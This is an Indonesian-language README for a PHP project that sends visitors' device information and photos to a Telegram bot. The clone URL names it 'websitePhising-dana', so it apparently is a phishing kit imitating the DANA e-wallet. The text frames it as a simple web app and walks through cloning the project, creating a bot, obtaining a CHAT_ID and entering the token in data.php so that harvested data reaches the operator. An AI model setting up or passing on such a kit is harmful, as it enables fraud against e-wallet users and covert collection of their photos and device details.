# 📦 Proyek Web PHP + Bot Telegram
Proyek ini adalah aplikasi web sederhana menggunakan PHP yang dapat mengirimkan data (Informasi perangkat & file foto) ke Bot Telegram dan meneruskannya ke CHAT_ID yang ditentukan.

## 🔧 Kebutuhan
* Akun Telegram
* Bot Telegram (via BotFather)
* CHAT_ID tujuan

## 🛠️ Fitur
* Web berbasis PHP
* Mengirim data (teks, gambar, dll.) ke Bot Telegram
* Data diteruskan ke chat tertentu melalui CHAT_ID


# 🚀 Cara Menjalankan Proyek Ini
## 1. Clone atau Download Proyek
bash\n
`git clone https://github.com/tsaqifassajeed/websitePhising-dana.git`

`cd websitePhising-dana`

## 2. Buat Bot Telegram
Buka Telegram dan cari [https://t.me/Botfather]\n
Ketik /newbot dan ikuti petunjuk untuk membuat bot\n
Simpan TOKEN yang diberikan\n

## 3. Dapatkan CHAT_ID
Cari chat yang ingin menerima pesan (bisa chat pribadi atau grup\n
Gunakan bot seperti https://t.me/userinfobot untuk melihat CHAT_ID\n
Jika dikirim ke grup, pastikan bot sudah ditambahkan ke grup dan gunakan API getUpdates untuk melihat chat.id\n

## 4. Edit File data.php
php\n
`<?php
$token = "ISI_DENGAN_TOKEN_BOT";
$chat_id = "ISI_DENGAN_CHAT_ID";
`
💡 Bisa dimodifikasi untuk mengirim foto, lokasi, dll.\n
## 5. Jalankan di Server Lokal (XAMPP/Laragon)
Letakkan proyek di folder htdocs (XAMPP) atau www (Laragon)\n
Jalankan server:\n
Buka browser: http://localhost/nama-folder-proyek/send.php\n
Cek Telegram — pesan akan muncul di chat!\n

Enjoy :)
